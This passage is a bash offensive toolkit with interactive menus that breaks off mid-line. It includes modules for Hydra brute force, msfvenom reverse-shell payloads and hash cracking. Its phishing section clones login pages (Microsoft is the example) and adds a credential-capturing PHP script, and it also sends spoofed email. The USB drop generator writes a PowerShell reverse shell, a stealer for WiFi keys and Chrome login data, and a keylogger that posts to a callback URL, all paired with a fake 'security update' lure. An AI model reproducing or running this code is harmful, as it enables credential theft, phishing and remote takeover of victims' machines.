# Subdomain enumeration
subdomain_enum() {
    echo -e "${BLUE}[*] Subdomain Enumeration Module${NC}"
    echo -n "Enter target domain (e.g., example.com): "
    read domain
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo ""
    echo -e "${CYAN}=== ENUMERATION METHODS ===${NC}"
    echo "1) DNS brute force"
    echo "2) Certificate transparency logs"
    echo "3) DNS zone transfer attempt"
    echo "4) All methods"
    echo -n "Select method: "
    read method
    
    local all_results=""
    
    case $method in
        1)
            echo -e "${YELLOW}[*] Running DNS brute force...${NC}"
            if [[ -f "$WORDLISTS_DIR/seclists/Discovery/DNS/subdomains-top1million-5000.txt" ]]; then
                while read sub; do
                    host "$sub.$domain" 2>/dev/null | grep "has address" &
                done < "$WORDLISTS_DIR/seclists/Discovery/DNS/subdomains-top1million-5000.txt" | head -50
                wait
            else
                for sub in www mail ftp admin portal api dev test staging; do
                    host "$sub.$domain" 2>/dev/null | grep "has address" &
                done
                wait
            fi
            ;;
        2)
            echo -e "${YELLOW}[*] Querying certificate transparency logs...${NC}"
            curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
                jq -r '.[].name_value' 2>/dev/null | sort -u | \
                grep -E "^[a-zA-Z0-9]" || echo -e "${YELLOW}[!] crt.sh query failed or jq not installed${NC}"
            ;;
        3)
            echo -e "${YELLOW}[*] Attempting zone transfer...${NC}"
            for ns in $(host -t ns "$domain" 2>/dev/null | awk '{print $4}'); do
                echo "Trying NS: $ns"
                host -l "$domain" "$ns" 2>&1 | head -20
            done
            ;;
        4)
            echo -e "${YELLOW}[*] Running all enumeration methods...${NC}"
            
            # DNS brute force
            all_results+="=== DNS BRUTE FORCE ===\n"
            for sub in www mail ftp admin portal api dev test staging shop blog; do
                local result=$(host "$sub.$domain" 2>/dev/null | grep "has address")
                [[ -n "$result" ]] && all_results+="$result\n"
            done
            
            # Certificate transparency
            all_results+="\n=== CERTIFICATE TRANSPARENCY ===\n"
            local ct_results=$(curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
                jq -r '.[].name_value' 2>/dev/null | sort -u | head -20)
            all_results+="${ct_results:-Query failed}\n"
            
            echo -e "$all_results"
            save_results_prompt "$all_results" "subdomains_$domain_$timestamp.txt" "enumeration"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# BRUTE FORCE & PASSWORD ATTACKS
# =============================================================================

# Multi-protocol brute force with Hydra
brute_force() {
    check_install hydra
    echo -e "${BLUE}[*] Brute Force Module${NC}"
    echo "Select service:"
    echo "1) SSH"
    echo "2) FTP"
    echo "3) SMB"
    echo "4) HTTP Basic Auth"
    echo "5) HTTP Form POST"
    echo "6) RDP"
    echo "7) VNC"
    echo "8) Telnet"
    echo -n "Choice: "
    read choice
    
    echo -n "Enter target IP: "
    read target
    echo -n "Enter username (or 'userlist.txt' for list): "
    read user
    echo -n "Use rockyou.txt wordlist? (y/n): "
    read use_rockyou
    
    if [[ "$use_rockyou" == "y" ]]; then
        wordlist="$WORDLISTS_DIR/rockyou.txt"
    else
        echo -n "Enter wordlist path: "
        read wordlist
    fi
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -n "Save brute force output? (y/n): "
    read save_output
    
    local output_file=""
    [[ "$save_output" == "y" ]] && output_file="$RESULTS_DIR/bruteforce/hydra_${target}_$timestamp.txt"
    
    case $choice in
        1)
            service="ssh"
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" "$service" -t 4 -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" "$service" -t 4
            fi
            ;;
        2)
            service="ftp"
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" "$service" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" "$service"
            fi
            ;;
        3)
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" smb -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" smb
            fi
            ;;
        4)
            echo -n "Enter URL path (e.g., /admin): "
            read path
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" http-get "$path" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" http-get "$path"
            fi
            ;;
        5)
            echo -n "Enter form path (e.g., /login.php): "
            read path
            echo -n "Enter username field name: "
            read user_field
            echo -n "Enter password field name: "
            read pass_field
            echo -n "Enter failure message (e.g., 'Invalid'): "
            read fail_msg
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" http-post-form "$path:$user_field=^USER^&$pass_field=^PASS^:$fail_msg" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" http-post-form "$path:$user_field=^USER^&$pass_field=^PASS^:$fail_msg"
            fi
            ;;
        6)
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" rdp://"$target" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" rdp://"$target"
            fi
            ;;
        7)
            if [[ -n "$output_file" ]]; then
                hydra -P "$wordlist" vnc://"$target" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -P "$wordlist" vnc://"$target"
            fi
            ;;
        8)
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" telnet://"$target" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" telnet://"$target"
            fi
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# PAYLOADS & EXPLOITATION
# =============================================================================

# Metasploit payload generator
payload_gen() {
    check_install metasploit-framework msfvenom
    echo -e "${BLUE}[*] Payload Generator (msfvenom)${NC}"
    echo "Select payload type:"
    echo "1) Linux x86 Reverse Shell"
    echo "2) Linux x64 Reverse Shell"
    echo "3) Windows Reverse Shell"
    echo "4) Windows Meterpreter (Staged)"
    echo "5) Windows Meterpreter (Stageless)"
    echo "6) macOS Reverse Shell"
    echo "7) Python Reverse Shell"
    echo "8) PHP Reverse Shell"
    echo "9) ASP.NET Reverse Shell"
    echo "10) Android APK"
    echo "11) Custom"
    echo -n "Choice: "
    read choice
    
    echo -n "Enter LHOST (your IP): "
    read lhost
    echo -n "Enter LPORT: "
    read lport
    echo -n "Enter output filename: "
    read filename
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    case $choice in
        1)
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$filename"
            ;;
        2)
            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$filename"
            ;;
        3)
            msfvenom -p windows/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$filename"
            ;;
        4)
            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$filename"
            ;;
        5)
            msfvenom -p windows/meterpreter_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$filename"
            ;;
        6)
            msfvenom -p osx/x86/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f macho -o "$filename"
            ;;
        7)
            msfvenom -p cmd/unix/reverse_python LHOST="$lhost" LPORT="$lport" -o "$filename"
            ;;
        8)
            msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "$filename"
            ;;
        9)
            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f aspx -o "$filename"
            ;;
        10)
            msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$filename"
            ;;
        11)
            echo -n "Enter msfvenom payload name: "
            read payload
            echo -n "Enter format (elf/exe/python/psh/macho/raw): "
            read format
            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$filename"
            ;;
    esac
    
    if [[ -f "$filename" ]]; then
        echo -e "${GREEN}[+] Payload saved as: $filename${NC}"
        
        # Optionally copy to results
        echo -n "Copy payload to ~/.superhack/results/exploitation/? (y/n): "
        read copy_payload
        if [[ "$copy_payload" == "y" ]]; then
            cp "$filename" "$RESULTS_DIR/exploitation/${timestamp}_$filename"
            echo -e "${GREEN}[+] Copied to results directory${NC}"
        fi
    else
        echo -e "${RED}[!] Payload generation may have failed${NC}"
    fi
    
    echo -e "${YELLOW}[*] Setting up listener...${NC}"
    echo "Run this in another terminal:"
    echo -e "${RED}msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD <payload>; set LHOST $lhost; set LPORT $lport; exploit\"${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Exploit search and information
exploit_search() {
    check_install metasploit-framework searchsploit
    echo -e "${BLUE}[*] Exploit Database Search${NC}"
    echo -n "Enter search term (service/version): "
    read term
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -n "Save search results? (y/n): "
    read save_results
    
    if [[ "$save_results" == "y" ]]; then
        local output_file="$RESULTS_DIR/exploitation/searchsploit_$timestamp.txt"
        searchsploit "$term" | tee "$output_file"
        echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    else
        searchsploit "$term"
    fi
    
    echo -n "View details of exploit? (enter ID or n): "
    read exploit_id
    if [[ "$exploit_id" != "n" ]]; then
        searchsploit -x "$exploit_id"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# PASSWORD CRACKING
# =============================================================================

# Hash cracking with John or Hashcat
password_crack() {
    echo -e "${BLUE}[*] Password Cracking Module${NC}"
    echo "1) John the Ripper"
    echo "2) Hashcat"
    echo "3) Identify hash type"
    echo -n "Choice: "
    read choice
    
    echo -n "Enter hash file path: "
    read hashfile
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -n "Save cracking output? (y/n): "
    read save_output
    
    local output_file=""
    [[ "$save_output" == "y" ]] && output_file="$RESULTS_DIR/cracking/crack_$timestamp.txt"
    
    case $choice in
        1)
            check_install john
            echo -n "Enter hash format (or 'auto'): "
            read format
            
            if [[ -n "$output_file" ]]; then
                if [[ "$format" == "auto" ]]; then
                    john "$hashfile" 2>&1 | tee "$output_file"
                else
                    john --format="$format" "$hashfile" 2>&1 | tee "$output_file"
                fi
                john --show "$hashfile" | tee -a "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                if [[ "$format" == "auto" ]]; then
                    john "$hashfile"
                else
                    john --format="$format" "$hashfile"
                fi
                john --show "$hashfile"
            fi
            ;;
        2)
            check_install hashcat
            echo -n "Enter hash mode number (0 for MD5, 100 for SHA1, etc): "
            read mode
            
            if [[ -n "$output_file" ]]; then
                hashcat -m "$mode" "$hashfile" "$WORDLISTS_DIR/rockyou.txt" --force -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hashcat -m "$mode" "$hashfile" "$WORDLISTS_DIR/rockyou.txt" --force
            fi
            ;;
        3)
            echo -e "${YELLOW}[*] Analyzing hash format...${NC}"
            john --show=formats "$hashfile" 2>/dev/null || \
            hashid "$hashfile" 2>/dev/null || \
            echo "Common formats to try: 0=MD5, 100=SHA1, 1000=NTLM, 5500=NetNTLMv1, 5600=NetNTLMv2"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# PHISHING TOOLS MODULE
# =============================================================================

# Phishing campaign manager
phishing_menu() {
    while true; do
        echo -e "${CYAN}"
        cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║              PHISHING & SOCIAL ENGINEERING                ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
        echo -e "${NC}"
        
        echo "1) Clone Website (Credential Harvester)"
        echo "2) Create Custom Phishing Page"
        echo "3) Email Spoofing/Sender"
        echo "4) View Captured Credentials"
        echo "5) Generate QR Code Phish"
        echo "6) USB Drop Attack Generator"
        echo "7) Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read phish_choice
        
        case $phish_choice in
            1) clone_website ;;
            2) custom_phish_page ;;
            3) email_spoofer ;;
            4) view_captured_creds ;;
            5) qr_code_phish ;;
            6) usb_drop_generator ;;
            7) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# Website cloning for credential harvesting
clone_website() {
    check_install httrack
    echo -e "${BLUE}[*] Website Cloning Tool${NC}"
    echo -n "Enter target URL to clone (e.g., https://login.microsoftonline.com): "
    read target_url
    echo -n "Enter local port for harvester (default 8080): "
    read harvest_port
    harvest_port=${harvest_port:-8080}
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local clone_dir="$PHISHING_DIR/cloned_site_$timestamp"
    create_dir "$clone_dir"
    
    echo -e "${YELLOW}[*] Cloning website... This may take a moment.${NC}"
    httrack "$target_url" -O "$clone_dir" -v --quiet | tail -20
    
    # Find and modify login form to capture credentials
    local login_file=$(find "$clone_dir" -name "*.html" -exec grep -l "password\|login\|signin" {} \; 2>/dev/null | head -1)
    
    if [[ -n "$login_file" ]]; then
        echo -e "${GREEN}[+] Found potential login page: $login_file${NC}"
        echo -n "Modify form to capture credentials? (y/n): "
        read modify_form
        
        if [[ "$modify_form" == "y" ]]; then
            # Create PHP capture script
            cat > "$clone_dir/capture.php" << 'PHPEOF'
<?php
$timestamp = date('Y-m-d H:i:s');
$data = "[$timestamp] ";
foreach($_POST as $key => $value) {
    $data .= "$key=$value; ";
}
$data .= "IP=".$_SERVER['REMOTE_ADDR']."\n";
file_put_contents('captured_creds.txt', $data, FILE_APPEND);
header('Location: https://login.microsoftonline.com'); // Redirect to real site
?>
PHPEOF
            
            # Modify HTML form to POST to capture.php
            sed -i 's/<form[^>]*>/<form action="capture.php" method="POST">/i' "$login_file"
            sed -i 's/https:\/\/login.microsoftonline.com/\./g' "$login_file" 2>/dev/null || true
            
            echo -e "${GREEN}[+] Form modified to capture credentials${NC}"
        fi
    fi
    
    echo -e "${YELLOW}[*] Starting PHP server on port $harvest_port...${NC}"
    echo -e "${CYAN}Access the cloned site at: http://$(hostname -I | awk '{print $1}'):$harvest_port${NC}"
    echo -e "${RED}[!] Press Ctrl+C to stop the server${NC}"
    echo ""
    
    cd "$clone_dir" && php -S "0.0.0.0:$harvest_port" 2>&1 | while read line; do
        echo "$line"
        # Check for captured credentials
        if [[ -f "$clone_dir/captured_creds.txt" ]]; then
            local new_creds=$(tail -1 "$clone_dir/captured_creds.txt")
            echo -e "${RED}[!] CAPTURED: $new_creds${NC}"
            cp "$clone_dir/captured_creds.txt" "$CREDS_DIR/creds_$timestamp.txt"
        fi
    done
}

# Custom phishing page generator
custom_phish_page() {
    echo -e "${BLUE}[*] Custom Phishing Page Generator${NC}"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local template_dir="$PHISHING_DIR/templates/custom_$timestamp"
    create_dir "$template_dir"
    
    echo "Select template type:"
    echo "1) Corporate Login"
    echo "2) Social Media Login"
    echo "3) Banking Login"
    echo "4) Email Login"
    echo "5) Custom HTML"
    echo -n "Choice: "
    read template_choice
    
    case $template_choice in
        1) template_name="Corporate Portal" ;;
        2) template_name="Social Media" ;;
        3) template_name="Banking" ;;
        4) template_name="Email Login" ;;
        5) template_name="Custom" ;;
    esac
    
    echo -n "Enter page title: "
    read page_title
    echo -n "Enter company/logo name: "
    read company_name
    echo -n "Enter redirect URL (after capture): "
    read redirect_url
    
    # Generate HTML
    cat > "$template_dir/index.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>$page_title</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
        .logo { text-align: center; font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #333; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #106ebe; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">$company_name</div>
        <form action="capture.php" method="POST">
            <input type="text" name="username" placeholder="Username/Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
EOF

    # Create capture script
    cat > "$template_dir/capture.php" << EOF
<?php
\$timestamp = date('Y-m-d H:i:s');
\$data = "[\$timestamp] ";
foreach(\$_POST as \$key => \$value) {
    \$data .= "\$key=\$value; ";
}
\$data .= "IP=".\$_SERVER['REMOTE_ADDR']."\\n";
file_put_contents('captured_creds.txt', \$data, FILE_APPEND);
header('Location: $redirect_url');
?>
EOF

    echo -n "Enter port to serve on (default 8080): "
    read serve_port
    serve_port=${serve_port:-8080}
    
    echo -e "${GREEN}[+] Phishing page created in: $template_dir${NC}"
    echo -e "${YELLOW}[*] Starting server...${NC}"
    echo -e "${CYAN}Access at: http://$(hostname -I | awk '{print $1}'):$serve_port${NC}"
    
    cd "$template_dir" && php -S "0.0.0.0:$serve_port"
}

# Email spoofing tool
email_spoofer() {
    check_install sendemail
    echo -e "${BLUE}[*] Email Spoofing/Sending Tool${NC}"
    echo -e "${RED}[!] WARNING: Only use for authorized testing!${NC}"
    echo ""
    
    echo -n "SMTP server (IP:port): "
    read smtp_server
    echo -n "From address (can be spoofed): "
    read from_addr
    echo -n "To address: "
    read to_addr
    echo -n "Subject: "
    read subject
    echo -n "Message body (or path to HTML file): "
    read body
    
    # Check if body is a file
    if [[ -f "$body" ]]; then
        body_arg="-o message-file=\"$body\""
    else
        body_arg="-u \"$body\""
    fi
    
    echo -n "Attachment file (optional, press Enter to skip): "
    read attachment
    [[ -n "$attachment" ]] && attach_arg="-a \"$attachment\"" || attach_arg=""
    
    echo -n "Use TLS/SSL? (y/n): "
    read use_tls
    [[ "$use_tls" == "y" ]] && tls_arg="-tls=yes" || tls_arg=""
    
    echo -e "${YELLOW}[*] Sending email...${NC}"
    sendemail -f "$from_addr" -t "$to_addr" -u "$subject" $body_arg -s "$smtp_server" $tls_arg $attach_arg -v
    
    echo -n "Press Enter to continue..."
    read
}

# View captured credentials
view_captured_creds() {
    echo -e "${BLUE}[*] Captured Credentials Database${NC}"
    echo ""
    
    # List all captured credential files
    local cred_files=("$CREDS_DIR"/*.txt "$PHISHING_DIR"/captured_*.txt "$PHISHING_DIR"/*/captured_creds.txt 2>/dev/null)
    
    if [[ ${#cred_files[@]} -eq 0 ]]; then
        echo -e "${YELLOW}[!] No captured credentials found${NC}"
    else
        echo -e "${GREEN}[+] Found credential files:${NC}"
        local i=1
        for file in "${cred_files[@]}"; do
            [[ -f "$file" ]] && echo "  $i) $file ($(wc -l < "$file") entries)"
            ((i++))
        done
        
        echo ""
        echo -n "View file number (or 'all'): "
        read view_choice
        
        if [[ "$view_choice" == "all" ]]; then
            for file in "${cred_files[@]}"; do
                [[ -f "$file" ]] && echo -e "\n=== $file ===" && cat "$file"
            done
        else
            local selected="${cred_files[$((view_choice-1))]}"
            [[ -f "$selected" ]] && cat "$selected"
        fi
    fi
    
    echo ""
    echo -n "Export to single file? (y/n): "
    read export_creds
    if [[ "$export_creds" == "y" ]]; then
        local export_file="$CREDS_DIR/all_creds_$(date +%Y%m%d).txt"
        cat "${cred_files[@]}" 2>/dev/null > "$export_file"
        echo -e "${GREEN}[+] Exported to: $export_file${NC}"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# QR Code phishing generator
qr_code_phish() {
    echo -e "${BLUE}[*] QR Code Phishing Generator${NC}"
    echo -n "Enter malicious URL: "
    read malicious_url
    echo -n "Output filename (without extension): "
    read qr_filename
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    # Check for qrencode or use Python
    if command -v qrencode &>/dev/null; then
        qrencode -o "$PHISHING_DIR/${qr_filename}.png" "$malicious_url"
        echo -e "${GREEN}[+] QR Code saved to: $PHISHING_DIR/${qr_filename}.png${NC}"
    else
        python3 -c "
import qrcode
qr = qrcode.QRCode(version=1, box_size=10, border=5)
qr.add_data('$malicious_url')
qr.make(fit=True)
img = qr.make_image(fill_color='black', back_color='white')
img.save('$PHISHING_DIR/${qr_filename}.png')
" 2>/dev/null && echo -e "${GREEN}[+] QR Code saved to: $PHISHING_DIR/${qr_filename}.png${NC}" || \
        echo -e "${RED}[!] Install qrencode or python3-qrcode${NC}"
    fi
    
    echo -e "${YELLOW}[*] QR Code points to: $malicious_url${NC}"
    echo -n "Press Enter to continue..."
    read
}

# USB drop attack generator
usb_drop_generator() {
    echo -e "${BLUE}[*] USB Drop Attack Generator${NC}"
    echo -e "${YELLOW}[*] Creates autorun payloads for USB devices${NC}"
    echo ""
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local usb_dir="$PHISHING_DIR/usb_payloads_$timestamp"
    create_dir "$usb_dir"
    
    echo "Select payload type:"
    echo "1) Reverse shell (PowerShell)"
    echo "2) Credential harvester"
    echo "3) Keylogger dropper"
    echo "4) Custom batch script"
    echo -n "Choice: "
    read usb_choice
    
    case $usb_choice in
        1)
            echo -n "Enter LHOST: "
            read lhost
            echo -n "Enter LPORT: "
            read lport
            
            cat > "$usb_dir/autorun.bat" << EOF
@echo off
powershell -WindowStyle Hidden -Command "\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
EOF
            ;;
        2)
            cat > "$usb_dir/autorun.bat" << 'EOF'
@echo off
powershell -Command "netsh wlan show profile * key=clear | Out-File %TEMP%\wifi_creds.txt; (Get-Content $env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data -ErrorAction SilentlyContinue | Out-File %TEMP%\chrome_creds.txt -Append); copy %TEMP%\wifi_creds.txt %CD%\captured\ 2>nul"
EOF
            create_dir "$usb_dir/captured"
            ;;
        3)
            echo -n "Enter callback URL for logs: "
            read callback_url
            cat > "$usb_dir/autorun.bat" << EOF
@echo off
powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; \$keys = ''; while(\$true){ Start-Sleep -m 10; for(\$i=1; \$i -le 254; \$i++){\$key = [System.Windows.Forms.SendKeys]::GetAsyncKeyState(\$i); if(\$key -eq -32767){\$keys += [char]\$i; if(\$keys.Length -gt 100){ Invoke-WebRequest -Uri '$callback_url' -Method POST -Body \$keys; \$keys = ''}}}}"
EOF
            ;;
        4)
            echo -n "Enter path to custom batch file: "
            read custom_batch
            [[ -f "$custom_batch" ]] && cp "$custom_batch" "$usb_dir/autorun.bat"
            ;;
    esac
    
    # Create autorun.inf for older Windows systems
    cat > "$usb_dir/autorun.inf" << EOF
[AutoRun]
Open=autorun.bat
Action=Open folder to view files
Label=USB Drive
Icon=%SystemRoot%\system32\SHELL32.dll,4
EOF

    # Create README for social engineering
    cat > "$usb_dir/README.txt" << EOF
IMPORTANT - Corporate Security Update

Please run the security update from this drive to ensure your system is protected.

Contact IT Support for assistance.
EOF

    echo -e "${GREEN}[+] USB payload created in: $usb_dir${NC}"
    echo -e "${YELLOW}[!] Copy contents to USB root. Disable antivirus on target.${NC}"
    echo -
